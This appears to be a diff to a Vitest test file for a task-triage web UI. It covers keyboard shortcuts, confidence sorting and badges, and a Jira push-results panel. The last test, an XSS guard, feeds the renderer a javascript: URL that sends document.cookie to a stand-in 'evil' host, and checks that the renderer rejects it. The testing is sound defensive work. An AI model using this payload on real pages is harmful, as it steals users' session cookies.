@@ -8,7 +8,18 @@
 //   (c) ui-11 — an in-place patch of one card preserves another card's
 //       expanded state (patch does not innerHTML-wipe the list).
 import { describe, it, expect, beforeEach } from 'vitest'
-import { renderTasks, patchTaskCard, escapeHtml } from './render.js'
+import {
+  renderTasks,
+  patchTaskCard,
+  escapeHtml,
+  resolveTriageAction,
+  isTypingTarget,
+  sortTasksByConfidence,
+  triageCard,
+  moveCardFocus,
+  orderedTaskCards,
+  renderPushResults,
+} from './render.js'
 import { $taskData, setTaskData } from './state.js'
 import { markTasksLoaded } from './render.js'
 
@@ -23,8 +34,10 @@ function mountDom() {
     <input type="checkbox" id="filterPending" checked>
     <input type="checkbox" id="filterApproved" checked>
     <input type="checkbox" id="filterRejected">
+    <input type="checkbox" id="filterPushed" checked>
     <input type="checkbox" id="filterFlagged">
-    <div id="taskList"></div>
+    <select id="sortConfidence"><option value="none" selected>none</option><option value="asc">asc</option><option value="desc">desc</option></select>
+    <div id="taskListWrap"><div id="taskList"></div></div>
     <template id="taskCardTemplate">
       <div class="task-card">
         <div class="task-header">
@@ -195,5 +208,194 @@ describe('ui-11 — optimistic in-place patch', () => {
 
     const after = document.querySelector('[data-task-id="t1"]')
     expect(after.classList.contains('expanded')).toBe(true)
+  })
+})
+
+describe('ui-14 — keyboard triage dispatch (pure)', () => {
+  it('maps keys to triage actions when NOT typing', () => {
+    expect(resolveTriageAction({ key: 'a', isTyping: false })).toBe('approve')
+    expect(resolveTriageAction({ key: 'r', isTyping: false })).toBe('reject')
+    expect(resolveTriageAction({ key: 'e', isTyping: false })).toBe('expand')
+    expect(resolveTriageAction({ key: 'j', isTyping: false })).toBe('next')
+    expect(resolveTriageAction({ key: 'k', isTyping: false })).toBe('prev')
+    expect(resolveTriageAction({ key: 'ArrowDown', isTyping: false })).toBe('next')
+    expect(resolveTriageAction({ key: 'ArrowUp', isTyping: false })).toBe('prev')
+  })
+
+  it('is case-insensitive for the letter keys', () => {
+    expect(resolveTriageAction({ key: 'A', isTyping: false })).toBe('approve')
+    expect(resolveTriageAction({ key: 'R', isTyping: false })).toBe('reject')
+  })
+
+  it('NEVER fires while typing in a form control', () => {
+    for (const key of ['a', 'r', 'e', 'j', 'k', 'ArrowDown', 'ArrowUp']) {
+      expect(resolveTriageAction({ key, isTyping: true })).toBe(null)
+    }
+  })
+
+  it('returns null for unrelated keys', () => {
+    expect(resolveTriageAction({ key: 'x', isTyping: false })).toBe(null)
+    expect(resolveTriageAction({ key: 'Enter', isTyping: false })).toBe(null)
+  })
+
+  it('isTypingTarget detects text-entry controls', () => {
+    const input = document.createElement('input')
+    const ta = document.createElement('textarea')
+    const sel = document.createElement('select')
+    const div = document.createElement('div')
+    expect(isTypingTarget(input)).toBe(true)
+    expect(isTypingTarget(ta)).toBe(true)
+    expect(isTypingTarget(sel)).toBe(true)
+    expect(isTypingTarget(div)).toBe(false)
+    expect(isTypingTarget(null)).toBe(false)
+  })
+})
+
+describe('ui-14 — triage acts on the FOCUSED card only, not while typing', () => {
+  it('triageCard approves the focused card via its save callback', () => {
+    const saved = []
+    setTaskData({ tasks: [makeTask({ id: 't1' }), makeTask({ id: 't2' })], config: {} })
+    renderTasks((dt) => saved.push(dt))
+
+    const cards = orderedTaskCards()
+    // Simulate the main.js handler: dispatch on the focused card.
+    const action = resolveTriageAction({ key: 'a', isTyping: false })
+    triageCard(action, cards[1])
+
+    expect(saved.length).toBe(1)
+    expect(saved[0].id).toBe('t2')
+    expect(saved[0].status).toBe('APPROVED')
+  })
+
+  it('a keypress inside a card input does NOT trigger triage', () => {
+    const saved = []
+    setTaskData({ tasks: [makeTask({ id: 't1' })], config: {} })
+    renderTasks((dt) => saved.push(dt))
+
+    const card = orderedTaskCards()[0]
+    const input = card.querySelector('.task-edit-title')
+    // The guard: main.js computes isTyping from the event target.
+    const action = resolveTriageAction({ key: 'a', isTyping: isTypingTarget(input) })
+    expect(action).toBe(null)
+    if (action) triageCard(action, card)
+    expect(saved.length).toBe(0)
+  })
+
+  it('expand triage toggles the focused card', () => {
+    setTaskData({ tasks: [makeTask({ id: 't1' })], config: {} })
+    renderTasks(() => {})
+    const card = orderedTaskCards()[0]
+    expect(card.classList.contains('expanded')).toBe(false)
+    triageCard('expand', card)
+    expect(card.classList.contains('expanded')).toBe(true)
+  })
+
+  it('moveCardFocus walks j/k between cards and wraps', () => {
+    setTaskData({ tasks: [makeTask({ id: 't1' }), makeTask({ id: 't2' })], config: {} })
+    renderTasks(() => {})
+    const cards = orderedTaskCards()
+    // No focus yet → next focuses first.
+    const a = moveCardFocus('next', null)
+    expect(a).toBe(cards[0])
+    const b = moveCardFocus('next', cards[0])
+    expect(b).toBe(cards[1])
+    // Wrap forward.
+    const c = moveCardFocus('next', cards[1])
+    expect(c).toBe(cards[0])
+    // Wrap backward.
+    const d = moveCardFocus('prev', cards[0])
+    expect(d).toBe(cards[1])
+  })
+})
+
+describe('ui-14 — confidence sort + badge', () => {
+  it('sortTasksByConfidence surfaces low-confidence first (asc) without mutating', () => {
+    const tasks = [{ confidence: 0.9 }, { confidence: 0.3 }, { confidence: 0.6 }]
+    const asc = sortTasksByConfidence(tasks, 'asc')
+    expect(asc.map((t) => t.confidence)).toEqual([0.3, 0.6, 0.9])
+    // original untouched
+    expect(tasks[0].confidence).toBe(0.9)
+    const desc = sortTasksByConfidence(tasks, 'desc')
+    expect(desc.map((t) => t.confidence)).toEqual([0.9, 0.6, 0.3])
+    const none = sortTasksByConfidence(tasks, 'none')
+    expect(none.map((t) => t.confidence)).toEqual([0.9, 0.3, 0.6])
+  })
+
+  it('renders a text-labelled confidence badge on the card header', () => {
+    setTaskData({ tasks: [makeTask({ confidence: 0.42 })], config: {} })
+    renderTasks(() => {})
+    const badge = document.querySelector('.conf-badge')
+    expect(badge).not.toBeNull()
+    expect(badge.textContent).toContain('42%')
+    expect(badge.classList.contains('conf-low')).toBe(true)
+  })
+
+  it('applies the sort control when rendering (low-confidence first)', () => {
+    document.getElementById('sortConfidence').value = 'asc'
+    setTaskData({
+      tasks: [
+        makeTask({ id: 'hi', confidence: 0.95, source_refs: [{ section_title: 'S', page_start: 1, page_end: 1 }] }),
+        makeTask({ id: 'lo', confidence: 0.1, source_refs: [{ section_title: 'S', page_start: 1, page_end: 1 }] }),
+      ],
+      config: {},
+    })
+    renderTasks(() => {})
+    const cards = orderedTaskCards()
+    expect(cards[0].dataset.taskId).toBe('lo')
+    expect(cards[1].dataset.taskId).toBe('hi')
+  })
+})
+
+describe('ui-23 — push results panel', () => {
+  it('lists pushed tasks with clickable Jira links', () => {
+    const panel = renderPushResults({
+      tasks: [
+        { id: '1', title: 'First', status: 'PUSHED', jira_issue_key: 'PROJ-1' },
+        { id: '2', title: 'Second', status: 'PUSHED', jira_issue_key: 'PROJ-2' },
+        { id: '3', title: 'NotPushed', status: 'APPROVED' },
+      ],
+      jiraServerUrl: 'https://acme.atlassian.net/',
+    })
+    expect(panel).not.toBeNull()
+    const links = panel.querySelectorAll('a.push-results-key')
+    expect(links.length).toBe(2)
+    expect(links[0].getAttribute('href')).toBe('https://acme.atlassian.net/browse/PROJ-1')
+    expect(links[0].textContent).toBe('PROJ-1')
+    expect(links[0].target).toBe('_blank')
+  })
+
+  it('surfaces an aggregate failure chip when some pushes failed', () => {
+    const panel = renderPushResults({
+      tasks: [{ id: '1', title: 'Ok', status: 'PUSHED', jira_issue_key: 'PROJ-1' }],
+      jiraServerUrl: 'https://acme.atlassian.net',
+      failedCount: 2,
+      firstError: 'permission denied',
+      errorChip: { label: 'Check credentials', className: 'sev-fixable' },
+    })
+    const chip = panel.querySelector('.sev-chip')
+    expect(chip).not.toBeNull()
+    expect(chip.textContent).toBe('Check credentials')
+    expect(panel.textContent).toContain('permission denied')
+    expect(panel.querySelector('.push-results-summary').textContent).toContain('2 failed')
+  })
+
+  it('returns null and renders nothing when there is nothing to report', () => {
+    const panel = renderPushResults({ tasks: [{ status: 'APPROVED' }], jiraServerUrl: '' })
+    expect(panel).toBe(null)
+    expect(document.getElementById('pushResultsPanel')).toBeNull()
+  })
+
+  it('does NOT emit a javascript:/non-http Jira-server link (XSS guard) — falls back to plain text', () => {
+    const panel = renderPushResults({
+      tasks: [{ id: '1', title: 'First', status: 'PUSHED', jira_issue_key: 'PROJ-1' }],
+      jiraServerUrl: 'javascript:fetch("//evil/"+document.cookie)//',
+    })
+    // No anchor at all — the malicious scheme is rejected, key shown as text.
+    expect(panel.querySelector('a')).toBeNull()
+    const key = panel.querySelector('.push-results-key')
+    expect(key.tagName).toBe('SPAN')
+    expect(key.textContent).toBe('PROJ-1')
+    // Belt-and-braces: nothing in the panel carries a javascript: href.
+    expect(panel.innerHTML.toLowerCase()).not.toContain('javascript:')
   })
 })
